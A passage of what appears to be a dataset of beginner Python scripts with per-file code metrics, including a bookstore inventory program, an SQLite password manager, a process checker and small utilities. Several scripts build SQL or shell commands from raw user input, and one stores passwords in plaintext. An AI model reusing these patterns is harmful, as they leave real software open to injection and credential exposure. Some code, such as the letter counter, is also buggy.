                                    os._exit(0)

                if choice3 == 2:

                    separator()

                    wb = int(input(""ENTER NO. OF BOOKS -- ""))

                    separator()

                    display = ""select * from books""
                    mycur.execute(display)
                    data2 = mycur.fetchall()

                    for y in data2:

                        if y[1] == book_name:

                            if wb > y[6]:

                                if y[6] > 0:

                                    print(""YOU CAN'T  BUT  THAT  MUCH  BOOKS"")

                                    separator()

                                    print(""BUT YOU CAN BUY"", y[6], ""BOOKS MAX"")

                                    separator()

                                    choice44 = input(
                                        ""DO YOU WANT TO BUY BOOK ?     Y/N -- ""
                                    )

                                    separator()

                                    k = y[6]

                                    if choice44 == ""y"" or choice44 == ""Y"":

                                        u2 = (
                                            ""update books set numbers_of_book=numbers_of_book -%s where name='%s'""
                                            % (k, book_name)
                                        )
                                        mycur.execute(u2)
                                        mycon.commit()

                                        print(""BOOK WAS BOUGHT"")

                                        separator()

                                        print(""THANKS FOR COMING"")

                                        separator()

                                        display = ""select * from books""
                                        mycur.execute(display)
                                        data2 = mycur.fetchall()

                                        for y in data2:

                                            if y[1] == book_name:

                                                if y[6] <= 8:

                                                    print(
                                                        ""WARNING!!!!!!!!!!!!!!!!!!!!!!!""
                                                    )
                                                    print(
                                                        ""NO.  OF THIS BOOK IS LOW"",
                                                        ""\tONLY"",
                                                        y[6],
                                                        ""LEFT"",
                                                    )

                                                    end_separator()

                                                    break

                                        separator()

                                        rep = input(
                                            ""Do  You  Want  To  Restart  ??    yes / no  --  ""
                                        ).lower()

                                        if rep == ""yes"":

                                            end_separator()

                                            separator()

                                            DBZ()

                                            continue

                                        else:

                                            end_separator()

                                            DBZ()

                                            os._exit(0)

                                    elif choice44 == ""n"" or choice44 == ""N"":

                                        print(
                                            ""SORRY  FOR  INCONVENIENCE  WE  WILL  TRY  TO  FULLFILL  YOUR  REQUIREMENT  AS  SOON  AS  POSSIBLE""
                                        )

                                        end_separator()

                                        separator()

                                        rep = input(
                                            ""Do  You  Want  To  Restart  ??    yes / no  --  ""
                                        ).lower()

                                        if rep == ""yes"":

                                            separator()

                                            DBZ()

                                            continue

                                        else:

                                            end_separator()

                                            DBZ()

                                            os._exit(0)

                                elif y[6] == 0:

                                    print(
                                        ""SORRY  NO  BOOK  LEFT  WE  WILL  TRY  TO  FULLFILL  YOUR  REQUIREMENT  AS  SOON  AS  POSSIBLE""
                                    )

                                    end_separator()

                                    separator()

                                    rep = input(
                                        ""Do  You  Want  To  Restart  ??    yes / no  --  ""
                                    ).lower()

                                    if rep == ""yes"":

                                        separator()

                                        DBZ()

                                        continue

                                    else:

                                        end_separator()

                                        DBZ()

                                        os._exit(0)

                            else:

                                u2 = (
                                    ""update books set numbers_of_book=numbers_of_book -%s where name='%s'""
                                    % (wb, book_name)
                                )
                                mycur.execute(u2)
                                mycon.commit()

                                print(""BOOK WAS BOUGHT"")

                                separator()

                                print(""THANKS FOR COMING"")

                                display = ""select * from books""
                                mycur.execute(display)
                                data2 = mycur.fetchall()

                                for y in data2:

                                    if y[1] == book_name:

                                        CNB2()

                                        separator()

                                        rep = input(
                                            ""Do  You  Want  To  Restart  ??    yes / no  --  ""
                                        ).lower()

                                        if rep == ""yes"":

                                            separator()

                                            DBZ()

                                            continue

                                        else:

                                            end_separator()

                                            DBZ()

                                            os._exit(0)

            else:

                separator()

                print(""NO BOOK IS BOUGHT"")

                end_separator()

                separator()

                rep = input(""Do  You  Want  To  Restart  ??    yes / no  --  "").lower()

                if rep == ""yes"":

                    separator()

                    DBZ()

                    continue

                else:

                    end_separator()

                    DBZ()

                    os._exit(0)

        else:

            separator()

            print(""SORRY NO BOOK WITH THIS NAME EXIST / NAME IS INCORRECT"")

            end_separator()

            separator()

            rep = input(""Do  You  Want  To  Restart  ??    yes / no  --  "").lower()

            if rep == ""yes"":

                separator()

                DBZ()

                continue

            else:

                end_separator()

                DBZ()

                os._exit(0)

    # ADDING BOOK

    if choice == 3:

        q10 = int(input(""ENTER NO. OF BOOKS TO ADD -- ""))

        separator()

        for k in range(q10):

            SNo10 = int(input(""ENTER SNo OF BOOK -- ""))
            name10 = input(""ENTER NAME OF BOOK --- "")
            author10 = input(""ENTER NAME OF AUTHOR -- "")
            year10 = int(input(""ENTER YEAR OF PUBLISHING -- ""))
            ISBN10 = input(""ENTER ISBN OF BOOK -- "")
            price10 = int(input(""ENTER PRICE OF BOOK -- ""))
            nob10 = int(input(""ENTER NO. OF BOOKS -- ""))

            display10 = ""select * from books where ISBN='%s'"" % (ISBN10)
            mycur.execute(display10)
            data20 = mycur.fetchone()

            if data20 != None:

                print(""This  ISBN Already Exists"")

                os._exit(0)

            else:

                insert = (SNo10, name10, author10, year10, ISBN10, price10, nob10)
                insert20 = ""insert into books values(%s,%s,%s,%s,%s,%s,%s)""
                mycur.execute(insert20, insert)
                mycon.commit()

                separator()

                print(""BOOK IS ADDED"")

                separator()

        rep = input(""Do  You  Want  To  Restart  ??    yes / no  --  "").lower()

        if rep == ""yes"":

            separator()

            DBZ()

            continue

        else:

            end_separator()

            DBZ()

            os._exit(0)

    # UPDATING BOOK

    if choice == 4:

        choice4 = input(""ENTER ISBN OF BOOK -- "")

        separator()

        display = ""select * from books where ISBN='%s'"" % (choice4)
        mycur.execute(display)
        data2 = mycur.fetchone()

        if data2 != None:

            SNo1 = int(input(""ENTER NEW SNo OF BOOK -- ""))
            name1 = input(""ENTER NEW NAME OF BOOK --- "")
            author1 = input(""ENTER NEW NAME OF AUTHOR -- "")
            year1 = int(input(""ENTER NEW YEAR OF PUBLISHING -- ""))
            ISBN1 = input(""ENTER NEW ISBN OF BOOK -- "")
            price1 = int(input(""ENTER NEW PRICE OF BOOK -- ""))
            nob = int(input(""ENTER NEW NO. OF BOOKS -- ""))
            insert = (SNo1, name1, author1, year1, ISBN1, price1, nob, choice4)
            update = ""update books set SNo=%s,Name=%s,Author=%s,Year=%s,ISBN=%s,Price=%s,numbers_of_book=%s where ISBN=%s""
            mycur.execute(update, insert)
            mycon.commit()

            separator()

            print(""BOOK IS UPDATED"")

            separator()

            rep = input(""Do  You  Want  To  Restart  ??    yes / no  --  "").lower()

            if rep == ""yes"":

                separator()

                DBZ()

                continue

            else:

                end_separator()

                DBZ()

                os._exit(0)

        else:

            print(""SORRY NO BOOK WITH THIS ISBN IS EXIST  /  INCORRECT ISBN"")

            print()
            print()

            separator()

            rep = input(""Do  You  Want  To  Restart  ??    yes / no  --  "").lower()

            if rep == ""yes"":

                separator()

                DBZ()

                continue

            else:

                end_separator()

                DBZ()

                os._exit(0)

    # DELETING A BOOK

    if choice == 5:

        ISBN1 = input(""ENTER ISBN OF THAT BOOK THAT YOU WANT TO DELETE -- "")
        display = ""select * from books where ISBN='%s'"" % (ISBN1)
        mycur.execute(display)
        data2 = mycur.fetchone()

        if data2 != None:

            separator()

            choice5 = input(""ARE YOU SURE TO DELETE THIS BOOK ENTER Y/N -- "")

            if choice5 == ""Y"" or choice5 == ""y"":

                separator()

                ISBN2 = input(""PLEASE ENTER ISBN AGAIN -- "")
                delete = ""delete from books where ISBN='%s'"" % (ISBN2)
                mycur.execute(delete)
                mycon.commit()

                separator()

                print(""BOOK IS DELETED"")

                print()
                print()

                separator()

                rep = input(""Do  You  Want  To  Restart  ??    yes / no  --  "").lower()

                if rep == ""yes"":

                    separator()

                    DBZ()

                    continue

                else:

                    end_separator()

                    DBZ()

                    os._exit(0)

            else:

                separator()

                print(""NO BOOK IS DELETED"")

                print()
                print()

                separator()

                rep = input(""Do  You  Want  To  Restart  ??    yes / no  --  "").lower()

                if rep == ""yes"":

                    separator()

                    DBZ()

                    continue

                else:

                    end_separator()

                    DBZ()

                    os._exit(0)

        else:

            separator()

            print(""SORRY NO BOOK WITH THIS ISBN AVAILABLE / ISBN IS INCORRECT"")

            print()
            print()

            separator()

            rep = input(""Do  You  Want  To  Restart  ??    yes / no  --  "").lower()

            if rep == ""yes"":

                separator()

                DBZ()

                continue

            else:

                end_separator()

                DBZ()

                os._exit(0)

    # CLOSE

    if choice == 6:

        exit()
        os._exit(0)


# IF  NO.  OF  BOOKS  IS     ZERO(  0  )     THAN  DELETE  IT  AUTOMATICALLY


display = ""select * from books""
mycur.execute(display)
data2 = mycur.fetchall()


for y in data2:

    if y[6] <= 0:

        delete = ""delete from books where  Numbers_of_book<=0""
        mycur.execute(delete)
        mycon.commit()
",22426,485,521,400,13,13,0,,20,91,11,182.0,93,,273,646.1955172380573,1829.220043052518,10.763440860215054,bajo,No,True,False,Very High,id432
divisors_of_a_number.py,"a = 0
while a<= 0 :
    number_to_divide = input(""choose the number to divide -->"")
    try :
        a = int(number_to_divide)
    except ValueError :
        a = 0
    if a <= 0 :
        print('choose a number grether than 0')
list_number_divided = []

for number in range(1,a + 1) :
    b = a % number
    if b == 0 :
        list_number_divided.append(number)
print('\nthe number ' + number_to_divide + ' can be divided by:')
for item in list_number_divided :
     print(f'{item}')
if len(list_number_divided) <= 2 :
    print(number_to_divide + ' is a prime number')",572,19,19,1,0,0,0,0.0,0,9,4,18.0,12,,27,51.01955000865388,108.0,3.0,medio,No,True,False,Low,id433
Binary Coefficients.py,"def pascal_triangle(lineNumber):
    list1 = list()
    list1.append([1])
    i = 1
    while i <= lineNumber:
        j = 1
        l = []
        l.append(1)
        while j < i:
            l.append(list1[i - 1][j] + list1[i - 1][j - 1])
            j = j + 1
        l.append(1)
        list1.append(l)
        i = i + 1
    return list1


def binomial_coef(n, k):
    pascalTriangle = pascal_triangle(n)
    return pascalTriangle[n][k - 1]
",445,18,18,2,0,0,0,2.0,4,9,4,18.0,8,,27,32.0,96.79398751947124,4.5,medio,No,False,False,Low,id434
password_manager.py,"import sqlite3
from getpass import getpass
import os

# set the environment variable ADMIN_PASS to your desired string, which will be your password.
ADMIN_PASSWORD = os.environ[""ADMIN_PASS""]
connect = getpass(""What is your admin  password?\n"")

while connect != ADMIN_PASSWORD:
    connect = getpass(""What is your admin password?\n"")
    if connect == ""q"":
        break

conn = sqlite3.connect(""password_manager.db"")
cursor_ = conn.cursor()


def get_password(service_):
    command = 'SELECT * from STORE WHERE SERVICE = ""' + service_ + '""'
    cursor = conn.execute(command)
    for row in cursor:
        username_ = row[1]
        password_ = row[2]
    return [username_, password_]


def add_password(service_, username_, password_):
    command = (
        'INSERT INTO STORE (SERVICE,USERNAME,PASSWORD) VALUES(""'
        + service_
        + '"",""'
        + username_
        + '"",""'
        + password_
        + '"");'
    )
    conn.execute(command)
    conn.commit()


def update_password(service_, password_):
    command = (
        'UPDATE STORE set PASSWORD = ""'
        + password_
        + '"" where SERVICE = ""'
        + service_
        + '""'
    )
    conn.execute(command)
    conn.commit()
    print(service_ + "" password updated successfully."")


def delete_service(service_):
    command = 'DELETE from STORE where SERVICE = ""' + service_ + '""'
    conn.execute(command)
    conn.commit()
    print(service_ + "" deleted from the database successfully."")


def get_all():
    cursor_.execute(""SELECT * from STORE"")
    data = cursor_.fetchall()
    if len(data) == 0:
        print(""No Data"")
    else:
        for row in data:
            print(""service = "", row[0])
            print(""username = "", row[1])
            print(""password = "", row[2])
            print()


def is_service_present(service_):
    cursor_.execute(""SELECT SERVICE from STORE where SERVICE = ?"", (service_,))
    data = cursor_.fetchall()
    if len(data) == 0:
        print(""There is no service named %s"" % service_)
        return False
    else:
        return True


if connect == ADMIN_PASSWORD:
    try:
        conn.execute(
            """"""CREATE TABLE STORE
            (SERVICE TEXT PRIMARY KEY NOT NULL,
            USERNAME TEXT NOT NULL,
            PASSWORD TEXT NOT NULL);
            """"""
        )
        print(""Your safe has been created!\nWhat would you like to store in it today?"")
    except:
        print(""You have a safe, what would you like to do today?"")

    while True:
        print(""\n"" + ""*"" * 15)
        print(""Commands:"")
        print(""quit = quit program"")
        print(""get = get username and password"")
        print(""getall = show all the details in the database"")
        print(""store = store username and password"")
        print(""update = update password"")
        print(""delete = delete a service details"")
        print(""*"" * 15)
        input_ = input("":"")

        if input_ == ""quit"":
            print(""\nGoodbye, have a great day.\n"")
            conn.close()
            break

        elif input_ == ""store"":
            service = input(""What is the name of the service?\n"")
            cursor_.execute(""SELECT SERVICE from STORE where SERVICE = ?"", (service,))
            data = cursor_.fetchall()
            if len(data) == 0:
                username = input(""Enter username : "")
                password = getpass(""Enter password : "")
                if username == """" or password == """":
                    print(""Your username or password is empty."")
                else:
                    add_password(service, username, password)
                    print(""\n"" + service.capitalize() + "" password stored\n"")
            else:
                print(""Service named {} already exists."".format(service))

        elif input_ == ""get"":
            service = input(""What is the name of the service?\n"")
            flag = is_service_present(service)
            if flag:
                username, password = get_password(service)
                print(service.capitalize() + "" Details"")
                print(""Username : "", username)
                print(""Password : "", password)

        elif input_ == ""update"":
            service = input(""What is the name of the service?\n"")
            if service == """":
                print(""Service is not entered."")
            else:
                flag = is_service_present(service)
                if flag:
                    password = getpass(""Enter new password : "")
                    update_password(service, password)

        elif input_ == ""delete"":
            service = input(""What is the name of the service?\n"")
            if service == """":
                print(""Service is not entered."")
            else:
                flag = is_service_present(service)
                if flag:
                    delete_service(service)

        elif input_ == ""getall"":
            get_all()

        else:
            print(""Invalid command."")
",4960,115,135,25,1,1,0,6.0,10,40,6,80.0,62,,120,384.6699462483133,730.4955409500408,3.870967741935484,bajo,No,True,False,Medium-High,id435
pscheck.py,"# Script Name		: pscheck.py
# Author				: Craig Richards
# Created				: 19th December 2011
# Last Modified		: 17th June 2013
# Version				: 1.1

# Modifications		: 1.1 - 17/06/13 - CR - Changed to functions, and check os before running the program

# Description			: Process check on Nix boxes, diplsay formatted output from ps command

import os
import string

import commands

try:
    input = raw_input
except NameError:
    pass


def ps():
    program = input(""Enter the name of the program to check: "")

    try:
        # perform a ps command and assign results to a list
        output = commands.getoutput(""ps -f|grep "" + program)
        proginfo = string.split(output)

        # display results
        print(
            ""\n\
    Full path:\t\t"",
            proginfo[5],
            ""\n\
    Owner:\t\t\t"",
            proginfo[0],
            ""\n\
    Process ID:\t\t"",
            proginfo[1],
            ""\n\
    Parent process ID:\t"",
            proginfo[2],
            ""\n\
    Time started:\t\t"",
            proginfo[4],
        )
    except:
        print(""There was a problem with the program."")


def main():
    if os.name == ""posix"":  # Unix/Linux/MacOS/BSD/etc
        ps()  # Call the function
    elif os.name in (""nt"", ""dos"", ""ce""):  # if the OS is windows
        print(""You need to be on Linux or Unix to run this"")


if __name__ == ""__main__"":
    main()
",1391,22,38,13,12,9,0,2.0,5,4,3,8.0,7,,12,24.406371956566694,39.86313713864836,1.7142857142857142,alto,No,True,False,Low,id436
numeric_password_cracker.py,"import itertools

def generate_password_permutations(length):
    # Generate numeric password permutations of the given length
    digits = ""0123456789""
    for combination in itertools.product(digits, repeat=length):
        password = """".join(combination)
        yield password

def password_cracker(target_password, max_length=8):
    # Try different password lengths and generate permutations
    for length in range(1, max_length + 1):
        password_generator = generate_password_permutations(length)
        for password in password_generator:
            if password == target_password:
                return password
    return None

if __name__ == ""__main__"":
    # Target numeric password (change this to the password you want to crack)
    target_password = ""9133278""

    # Try cracking the password
    cracked_password = password_cracker(target_password)

    if cracked_password:
        print(f""Password successfully cracked! The password is: {cracked_password}"")
    else:
        print(""Password not found. Try increasing the max_length or target a different password."")

",1125,20,20,6,4,4,0,2.0,6,3,2,6.0,6,,9,17.509775004326936,27.0,1.0,alto,No,False,False,Low,id437
Python Program for Tower of Hanoi.py,"# Recursive Python function to solve the tower of hanoi 
def TowerOfHanoi(n , source, destination, auxiliary): 
	if n==1: 
		print(""Move disk 1 from source "",source,"" to destination "",destination) 
		return
	TowerOfHanoi(n-1, source, auxiliary, destination) 
	print(""Move disk "",n,"" from source "",source,"" to destination "",destination)
	TowerOfHanoi(n-1, auxiliary, destination, source)  
n = 4
TowerOfHanoi(n,'A','B','C')
",423,9,9,0,1,1,0,1.0,2,3,2,6.0,2,4.0,9,4.0,18.0,3.0,alto,No,False,False,Low,id438
counter.py,"""""""
    Class resposible for counting words for different files:
    - Reduce redundant code
    - Easier code management/debugging
    - Code readability
""""""

class Counter:

    def __init__(self, text:str) -> None:
        self.text = text

        # Define the initial count of the lower and upper case.
        self.count_lower = 0
        self.count_upper = 0
        self.count()

    def count(self) -> None:
        
        for char in self.text:
            if char.lower():
                self.count_lower += 1
            elif char.upper():
                self.count_upper += 1

        return (self.count_lower, self.count_upper)
    
    def get_total_lower(self) -> int:
        return self.count_lower

    def get_total_upper(self) -> int:
        return self.count_upper

    def get_total(self) -> int:
        return self.count_lower + self.count_upper",875,20,19,9,1,1,6,5.0,10,3,1,6.0,5,,9,11.60964047443681,23.264662506490403,0.6,alto,Yes,False,False,Low,id439
CountMillionCharacters-2.0.py,"""""""Get the number of each character in any given text.
Inputs:
A txt file -- You will be asked for an input file. Simply input the name
of the txt file in which you have the desired text.
""""""

import collections
import pprint


def main():
    file_input = input(""File Name: "")
    try:
        with open(file_input, ""r"") as info:
            count = collections.Counter(info.read().upper())
    except FileNotFoundError:
        print(""Please enter a valid file name."")
        main()

    value = pprint.pformat(count)
    print(value)
    exit()


if __name__ == ""__main__"":
    main()
",589,16,15,6,0,0,5,1.0,2,1,1,2.0,2,,3,2.0,4.754887502163469,0.5,alto,No,True,False,Low,id440
puttylogs.py,"# Script Name		: puttylogs.py
# Author				: Craig Richards
# Created				: 13th October 2011
# Last Modified		: 29th February 2012
# Version				: 1.2

# Modifications		: 1.1 - Added the variable zip_program so you can set it for the zip program on whichever OS, so to run on a different OS just change the locations of these two variables.
# 							: 1.2 - 29-02-12 - CR - Added shutil module and added one line to move the zipped up logs to the zipped_logs directory

# Description			: Zip up all the logs in the given directory

import os  # Load the Library Module
import shutil  # Load the Library Module - 1.2
from time import strftime  # Load just the strftime Module from Time

logsdir = ""c:\logs\puttylogs""  # Set the Variable logsdir
zipdir = ""c:\logs\puttylogs\zipped_logs""  # Set the Variable zipdir - 1.2
zip_program = ""zip.exe""  # Set the Variable zip_program - 1.1

for files in os.listdir(logsdir):  # Find all the files in the directory
    if files.endswith("".log""):  # Check to ensure the files in the directory end in .log
        files1 = (
            files + ""."" + strftime(""%Y-%m-%d"") + "".zip""
        )  # Create the Variable files1, this is the files in the directory, then we add a suffix with the date and the zip extension
        os.chdir(logsdir)  # Change directory to the logsdir
        os.system(
            zip_program + "" "" + files1 + "" "" + files
        )  # Zip the logs into dated zip files for each server. - 1.1
        shutil.move(
            files1, zipdir
        )  # Move the zipped log files to the zipped_logs directory - 1.2
        os.remove(files)  # Remove the original log files
",1633,13,19,5,21,8,0,0.0,0,7,1,14.0,12,,21,43.01955000865388,77.70923408096293,0.5833333333333334,alto,No,False,False,Low,id441
question 5.py,"""""""Write a function in python to count the number of lowercase
alphabets present in a text file âhappy.txt""""""

import time, os
from counter import Counter

print(""You will see the count of lowercase, uppercase and total count of alphabets in provided file.."")


file_path = input(""Please, Enter file path: "")

if os.path.exists(file_path):
    print('The file exists and this is the path:\n',file_path) 


def lowercase(file_path):
    try:

        with open(file_path) as F:
            word_counter = Counter(F.read())
            
            print(f""The total number of lower case letters are {word_counter.get_total_lower()}"")
            time.sleep(0.5)
            print(f""The total number of upper case letters are {word_counter.get_total_upper()}"")
            time.sleep(0.5)
            print(f""The total number of letters are {word_counter.get_total()}"")
            time.sleep(0.5)

    except FileNotFoundError:
        print(""File is not exist.. Please check AGAIN"")




if __name__ == ""__main__"":

    lowercase(file_path)
",1079,21,20,15,0,0,2,1.0,2,1,1,2.0,2,,3,2.0,4.754887502163469,0.5,alto,No,True,False,Low,id442
SOUNDEX.py,"# -*- coding: utf-8 -*-


def SOUNDEX(TERM: str):

    # Step 0: Covert the TERM to UpperCase
    TERM = TERM.upper()
    TERM_LETTERS = [char for char in TERM if char.isalpha()]

    # List the Remove occurrences of A, E, I, O, U, Y, H, W.
    Remove_List = (""A"", ""E"", ""I"", ""O"", ""U"", ""Y"", ""H"", ""W"")
    # Save the first letter
    first_letter = TERM_LETTERS[0]
    # Take the Other letters instead of First_Letter
    Characters = TERM_LETTERS[1:]
    # Remove items from Character using Remove_List
    Characters = [
        To_Characters
        for To_Characters in Characters
        if To_Characters not in Remove_List
    ]

    # if len(Characters) == 0:
    #    return first_letter + ""000""

    # Replace all the Characters with Numeric Values (instead of the first letter) with digits according to Soundex Algorythem Ruels
    Replace_List = {
        (""B"", ""F"", ""P"", ""V""): 1,
        (""C"", ""G"", ""J"", ""K"", ""Q"", ""S"", ""X"", ""Z""): 2,
        (""D"", ""T""): 3,
        (""L""): 4,
        (""M"", ""N""): 5,
        (""R""): 6,
    }
    Characters = [
        value if char else char
        for char in Characters
        for group, value in Replace_List.items()
        if char in group
    ]

    # Step 3: Replace all adjacent same number with one number
    Characters = [
        char
        for Letter_Count, char in enumerate(Characters)
        if (
            Letter_Count == len(Characters) - 1
            or (
                Letter_Count + 1 < len(Characters)
                and char != Characters[Letter_Count + 1]
            )
        )
    ]

    # If the saved Charactersâs Number is the same the resulting First Letter,keep the First Letter AND remove the Number
    if len(TERM_LETTERS) != 1:
        if first_letter == TERM_LETTERS[1]:
            Characters[0] = TERM[0]
        else:
            Characters.insert(0, first_letter)

    # If the Number of Characters are less than 4 insert 3 zeros to Characters
    # Remove all except first letter and 3 digits after it.
    # first_letter = Characters[0]
    # Characters = Characters[1:]

    # Characters = [char for char in Characters if isinstance(char, int)][0:3]
    while len(Characters) < 4:
        Characters.append(0)
    if len(Characters) > 4:
        Characters = Characters[0:4]

    INDEX = """".join([str(C) for C in Characters])
    return INDEX
",2340,24,47,11,16,16,0,1.0,18,14,10,28.0,21,,42,125.4579468272276,208.0762450362488,6.666666666666667,medio,No,False,False,Medium,id443
alexa_news_headlines.py,"import json
import time

import requests
import unidecode
from flask import Flask
from flask_ask import Ask, question, statement

app = Flask(__name__)
ask = Ask(app, ""/reddit_reader"")


def get_headlines():
    user_pass_dict = {""user"": ""USERNAME"", ""passwd"": ""PASSWORD"", ""api_type"": ""json""}
    sess = requests.Session()
    sess.headers.update({""User-Agent"": ""I am testing Alexa: nobi""})
    sess.post(""https://www.reddit.com/api/login/"", data=user_pass_dict)
    time.sleep(1)
    url = ""https://reddit.com/r/worldnews/.json?limit=10""
    html = sess.get(url)
    data = json.loads(html.content.decode(""utf-8""))
    titles = [
        unidecode.unidecode(listing[""data""][""title""])
        for listing in data[""data""][""children""]
    ]
    titles = ""... "".join([i for i in titles])
    return titles


@app.route(""/"")
def homepage():
    return ""hi there!""


@ask.launch
def start_skill():
    welcome_message = ""Hello there, would you like to hear the news?""
    return question(welcome_message)


@ask.intent(""YesIntent"")
def share_headlines():
    headlines = get_headlines()
    headline_msg = ""The current world news headlines are {}"".format(headlines)
    return statement(headline_msg)


@ask.intent(""NooIntent"")
def no_intent():
    bye_text = ""I am not sure why you then turned me on. Anyways, bye for now!""
    return statement(bye_text)


if __name__ == ""__main__"":
    app.run(port=8000, debug=True)
",1414,40,41,14,0,0,0,5.0,7,1,1,2.0,2,,3,2.0,4.754887502163469,0.5,medio,No,False,False,,id444
